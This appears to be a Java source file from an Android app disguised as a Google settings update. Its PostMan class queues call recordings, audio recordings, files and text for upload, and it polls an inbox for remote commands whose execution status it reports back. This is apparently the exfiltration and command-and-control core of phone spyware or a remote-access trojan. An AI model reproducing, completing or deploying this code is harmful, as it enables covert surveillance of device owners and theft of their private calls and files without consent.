package com.setting.dl.google.googlesettingupdate.ptt.kahverengi;

import android.content.Context;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.setting.dl.google.googlesettingupdate.ptt.command.ICommand;
import com.setting.dl.google.googlesettingupdate.ptt.message.MessageType;
import com.setting.dl.google.googlesettingupdate.ptt.message.IMessage;
import com.setting.dl.google.googlesettingupdate.ptt.message.Message;
import com.setting.dl.google.googlesettingupdate.save.Save;
import com.setting.dl.google.googlesettingupdate.u;

import java.io.File;
import java.lang.ref.WeakReference;

public class PostMan implements IPostMan {
   
   private static       WeakReference<PostMan> postMan;
   private final        Context                context;
   private static final Object                 OBJECT = new Object();
   private              Save                   save;
   
   private PostMan(Context context) {
      
      this.context = context;
      save = new Save(context, "posts");
   }
   
   @NonNull
   public static PostMan getInstance(@NonNull final Context context) {
      
      if (postMan == null || postMan.get() == null) {
         
         synchronized (OBJECT) {
            
            if (postMan == null || postMan.get() == null) {
               
               postMan = new WeakReference<>(new PostMan(context));
            }
         }
      }
      
      return postMan.get();
   }
   
   @Override
   public void postTextFile(File file) {
      
      postTextFile(file, null);
   }
   
   @Override
   public void postTextFile(@NonNull File file, @Nullable String commandId) {
      
      if (!u.isOnline(context)) {
         
         if (commandId != null) {
            
            setCommandExecuting(false, commandId, "internet yok");
         }
         
         return;
      }
      
      IMessage message = new Message(MessageType.TEXT_FILE, file, commandId);
      
      post(message);
   }
   
   @Override
   public void postFile(File file) {
      
      postFile(file, null);
   }
   
   public void postFile(File file, String id) {
      
      postFile(file, null, null, id);
   }
   
   @Override
   public void postFile(File file, String subject, String body, String commandId) {
      
      if (!u.isOnline(context)) {
         
         if (commandId != null) {
            
            setCommandExecuting(false, commandId, "internet yok");
         }
         
         return;
      }
      
      IMessage message = new Message(MessageType.FILE, file, commandId);
      message.setSubject(subject);
      message.setBody(body);
      
      post(message);
   }
   
   @Override
   public void postAudio(File file) {
      
      postAudio(file, null);
   }
   
   @Override
   public void postAudio(File file, String commandId) {
      
      if (!u.isOnline(context)) {
         
         if (commandId != null) {
            
            setCommandExecuting(false, commandId, "internet yok");
         }
         
         return;
      }
      
      IMessage message = new Message(MessageType.AUDIO, file, commandId);
      
      post(message);
   }
   
   @Override
   public void postText(String title, String text) {
      
      postText(title, text, null);
   }
   
   @Override
   public void postText(String title, String text, String commandId) {
      
      if (!u.isOnline(context)) {
         
         u.saveToFile(context, title, text);
         
         if (commandId != null) {
            
            setCommandExecuting(false, commandId, "internet yok");
         }
         
         return;
      }
      
      IMessage message = new Message(MessageType.TEXT, commandId);
      
      message.setSubject(title);
      message.setBody(text);
      
      post(message);
   }
   
   @Override
   public void postCall(File file) {
      
      postCall(file, null);
   }
   
   @Override
   public void postCall(File file, String commandId) {
      
      if (!u.isOnline(context)) {
         
         if (commandId != null) {
            
            setCommandExecuting(false, commandId, "internet yok");
         }
         
         return;
      }
      
      IMessage message = new Message(MessageType.CALL, file, commandId);
      
      post(message);
   }
   
   @Override
   public void checkInbox() {
      
      if (u.isOnline(context)) PTTKahverengi.getInstance(context).checkInbox();
   }
   
   private void post(IMessage message) {
      
      PTTKahverengi.getInstance(context).addToOutbox(message);
   }
   
   @Override
   public void checkAudioFiles() {
      checkAudioFiles(null);
   }
   
   @Override
   public void checkAudioFiles(@Nullable String id) {
      
      if (u.isOnline(context)) {
         
         PTTKahverengi.getInstance(context).checkAudioFiles(id);
      }
      else {
         
         PTTKahverengi.getInstance(context).onCheckComplete(id);
      }
   }
   
   @Override
   public void checkCallFiles() {
      checkCallFiles(null);
   }
   
   @Override
   public void checkCallFiles(@Nullable String id) {
      
      if (u.isOnline(context)) PTTKahverengi.getInstance(context).checkCallFiles(id);
      else PTTKahverengi.getInstance(context).onCheckComplete(id);
   }
   
   @Override
   public void checkTextFiles(@Nullable String id) {
      
      if (u.isOnline(context)) PTTKahverengi.getInstance(context).checkTextFiles(id);
      else setCommandExecuting(false, id, "internet yok");
   }
   
   @Override
   public void checkTextFiles() {
      checkTextFiles(null);
   }
   
   @Override
   public void checkSent() {
      
      if (u.isOnline(context)) {
         
         PTTKahverengi.getInstance(context).checkSent();
      }
      
   }
   
   @Override
   public void setCommandExecuted(String id, String comment) {
      
      PTTKahverengi.getInstance(context).setCommandExecuted(id, comment);
   }
   
   @Override
   public void setCommandExecuting(boolean isExecuting, String id, String comment) {
      
      PTTKahverengi.getInstance(context).setCommandExecuting(isExecuting, id, comment);
   }
   
   @Override
   public void deleteAllCommands() {
      
      PTTKahverengi.getInstance(context).deleteAllCommands();
   }
   
   @Override
   public ICommand getCommand(String commandId) {
      return PTTKahverengi.getInstance(context).getCommand(commandId);
   }
}
